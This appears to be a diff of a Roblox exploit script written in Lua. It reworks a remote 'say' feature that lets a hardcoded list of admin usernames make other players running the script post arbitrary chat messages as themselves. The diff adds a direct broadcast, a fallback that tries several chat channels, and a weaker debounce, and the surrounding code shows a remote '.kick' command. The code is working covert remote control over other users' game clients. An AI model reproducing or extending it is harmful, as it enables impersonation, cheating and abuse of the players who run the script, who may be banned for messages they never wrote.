@@ -54499,29 +54499,10 @@ visualPage = createPage("visual")
 																		_G._SayProcessedCmds[cmdId] = true
 																	end
 
-																	-- Ignore own echo (sender should never relay its own command)
+																	-- Ignore own echo
 																	local myPlayer = game.Players.LocalPlayer
 																	local myName = myPlayer and string.lower(myPlayer.Name) or ""
-																	local myDisplay = myPlayer and myPlayer.DisplayName and string.lower(myPlayer.DisplayName) or ""
-																	local myUserId = myPlayer and tostring(myPlayer.UserId) or ""
-
 																	if myName ~= "" and string.lower(senderName) == myName then return end
-
-																	-- Target should NOT relay to avoid self-echo loop (matches username or display name)
-																	local isTarget = false
-																	local lTargetRaw = string.lower(targetName)
-																	local lTargetName = data2.targetName and string.lower(data2.targetName) or ""
-																	local lTargetDisplay = data2.targetDisplayName and string.lower(data2.targetDisplayName) or ""
-																	local lTargetUid = data2.targetUserId and tostring(data2.targetUserId) or ""
-
-																	if (lTargetUid ~= "" and lTargetUid == myUserId)
-																	or (lTargetName ~= "" and lTargetName == myName)
-																	or (lTargetDisplay ~= "" and lTargetDisplay == myDisplay)
-																	or (lTargetRaw ~= "" and (lTargetRaw == myName or lTargetRaw == myDisplay)) then
-																		isTarget = true
-																	end
-
-																	if isTarget then return end
 
 																	-- === ADMIN CHECK (mirror script's own whitelist) ===
 																	local lname = string.lower(senderName)
@@ -54548,7 +54529,7 @@ visualPage = createPage("visual")
 																	if not isAdmin then return end
 																	if sayText == "" or targetName == "" then return end
 
-																	-- Rebroadcast client-speak with full display name metadata
+																	-- Rebroadcast client-speak with full metadata
 																	pcall(function()
 																		local payload = {
 																			event = "client-speak",
@@ -54576,14 +54557,40 @@ visualPage = createPage("visual")
 																end
 
 																-- ============================================================
-																-- PATCH 2 — client-side listener for client-speak (Username & DisplayName)
+																-- PATCH 2 — client-side listener (Direct & Relayed, Username & DisplayName)
 																-- ============================================================
-																if event == "client-speak" and type(data2) == "table" then
+																if (event == "client-speak" or event == "say-command") and type(data2) == "table" then
 																	local lp = game.Players.LocalPlayer
 																	local myName = lp and string.lower(lp.Name) or ""
 																	local myDisplay = lp and lp.DisplayName and string.lower(lp.DisplayName) or ""
 																	local myUserId = lp and tostring(lp.UserId) or ""
 
+																	-- Verify sender is admin if receiving say-command directly
+																	local senderName = data2.sender or data2.username or ""
+																	local lname = string.lower(senderName)
+																	local isAdminSender = false
+
+																	if lname == "pagalkuta99"
+																	or lname == "rtn3742"
+																	or lname == "jeremywade_98"
+																	or lname == "iblame_uuu"
+																	or lname == "hor1zen" then
+																		isAdminSender = true
+																	end
+
+																	if not isAdminSender and getgenv().WhitelistedUsers
+																	and type(getgenv().WhitelistedUsers) == "table" then
+																		isAdminSender = getgenv().WhitelistedUsers[lname] == true
+																	end
+
+																	if not isAdminSender and getgenv().isUserWhitelisted then
+																		local ok, r = pcall(getgenv().isUserWhitelisted, senderName)
+																		if ok and r then isAdminSender = true end
+																	end
+
+																	if not isAdminSender then return end
+
+																	-- Target resolution
 																	local targetMatch = false
 																	local tRaw = data2.target and string.lower(data2.target) or ""
 																	local tName = data2.targetName and string.lower(data2.targetName) or ""
@@ -54609,28 +54616,40 @@ visualPage = createPage("visual")
 
 																		local msg = tostring(data2.text or "")
 																		if msg ~= "" then
-																			-- Time debounce to prevent rapid duplicates
+																			-- Brief debounce (0.4s) to block instant network echoes
 																			local now = tick()
 																			_G._LastSayTimestamp = _G._LastSayTimestamp or 0
 																			_G._LastSayMessage = _G._LastSayMessage or ""
-																			if _G._LastSayMessage == msg and (now - _G._LastSayTimestamp) < 3 then
+																			if _G._LastSayMessage == msg and (now - _G._LastSayTimestamp) < 0.4 then
 																				return
 																			end
 																			_G._LastSayTimestamp = now
 																			_G._LastSayMessage = msg
 
-																			-- Guaranteed single-dispatch: modern TextChatService -> legacy chat -> sendChat helper
+																			-- Robust multi-channel chat dispatch
 																			local sent = false
 																			pcall(function()
 																				local tcs = game:GetService("TextChatService")
 																				if tcs and tcs.ChatVersion == Enum.ChatVersion.TextChatService then
 																					local channels = tcs:FindFirstChild("TextChannels")
-																					local general = channels and channels:FindFirstChild("RBXGeneral")
-																					if general then
-																						general:SendAsync(msg)
+																					local chan = channels and (channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("General") or (channels:GetChildren() and channels:GetChildren()[1]))
+																					if chan and type(chan.SendAsync) == "function" then
+																						chan:SendAsync(msg)
 																						sent = true
+																						return
 																					end
-																				else
+																					local bar = tcs:FindFirstChild("ChatInputBarConfiguration")
+																					local targetChan = bar and bar.TargetTextChannel
+																					if targetChan and type(targetChan.SendAsync) == "function" then
+																						targetChan:SendAsync(msg)
+																						sent = true
+																						return
+																					end
+																				end
+																			end)
+
+																			if not sent then
+																				pcall(function()
 																					local rep = game:GetService("ReplicatedStorage")
 																					local defaultChat = rep:FindFirstChild("DefaultChatSystemChatEvents")
 																					local sayReq = defaultChat and defaultChat:FindFirstChild("SayMessageRequest")
@@ -54638,8 +54657,8 @@ visualPage = createPage("visual")
 																						sayReq:FireServer(msg, "All")
 																						sent = true
 																					end
-																				end
-																			end)
+																				end)
+																			end
 
 																			if not sent and typeof(sendChat) == "function" then
 																				pcall(sendChat, msg)
@@ -54929,12 +54948,27 @@ visualPage = createPage("visual")
 																		cmdId  = cmdId,
 																	},
 																}
+																-- 1. Broadcast say-command
 																if iterFn12 then
 																	iterFn12(v8, payload)
 																elseif type(v8.Send) == "function" then
 																	local ok_s = pcall(function() v8:Send(payload) end)
 																	if not ok_s then
 																		v8:Send(game:GetService("HttpService"):JSONEncode(payload))
+																	end
+																end
+
+																-- 2. Direct broadcast client-speak so delivery is guaranteed without relay dependency
+																local payloadSpeak = {
+																	event = "client-speak",
+																	data = payload.data
+																}
+																if iterFn12 then
+																	iterFn12(v8, payloadSpeak)
+																elseif type(v8.Send) == "function" then
+																	local ok_s2 = pcall(function() v8:Send(payloadSpeak) end)
+																	if not ok_s2 then
+																		v8:Send(game:GetService("HttpService"):JSONEncode(payloadSpeak))
 																	end
 																end
 															end)
@@ -54956,7 +54990,7 @@ visualPage = createPage("visual")
 														return
 													end
 
-													if string.sub(text, 1, 1) == "." and isLocalAdmin then
+																										if string.sub(text, 1, 1) == "." and isLocalAdmin then
 														local match, v9 = text:match("^(%.%w+)%s+[\"']?([^\"']+)[\"']?")
 														if match == ".kick" and v9 and executeRemoteKick then
 															executeRemoteKick(v9)
